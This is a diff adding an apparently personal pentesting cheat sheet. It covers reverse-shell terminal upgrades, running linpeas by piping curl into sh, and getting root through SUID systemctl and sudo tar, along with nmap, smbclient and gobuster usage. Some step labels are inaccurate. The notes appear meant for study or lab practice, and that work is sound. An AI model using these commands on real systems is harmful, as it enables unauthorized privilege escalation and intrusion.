@@ -1,0 +1,62 @@
+HOW TO GET TERMINAL FROM REVERSE SHELL
+_________________________________________________________________________________
+
+1. verify python "which python"
+
+2. Get full path of current directory "python -c 'import pty; pty.spawn("/bin/bash")'
+
+3. Find terminal software echo $TERM
+
+4. stty -a to get num rows and num columns
+
+5. type stty raw -echo
+
+6. type fg then enter
+
+7. type reset then intput terminal type
+
+8. specifies rows with stty rows # columns #
+
+
+HOW TO RUN LINPEAS ON MACHINE
+_________________________________________________________________________________
+run (curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh)
+
+HOW TO SCAN ALL PORTS
+_________________________________________________________________________________
+nmap -A IP
+
+_________________________________________________________________________________
+
+if a machine has a set SUID it can be exploited and give us root priveleges
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+this command can be configure and help us get root priveleges
+ExecStart will the where the hacker and input the command they want to be run
+in this case running "chmod +s /bin/bash/"
+and running " bash -p" can give us root priveleges
+
+________________________________________________________________________________
+
+to check what a user can run do "sudo -l"
+
+________________________________________________________________________________
+
+tar can be a way to escalate user priveleges:
+sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+running this can get us root with a tar exploit
+________________________________________________________________________________
+HOW TO CONNECT TO MACHINE VIA SMB:
+
+smbclient //IP/User
+________________________________________________________________________________
+-HOW TO BRUTE FORCE DIRECTORIES
+gobuster dir -u URL -w WORDLIST LOCATION -x TYPE OF EXTENSION
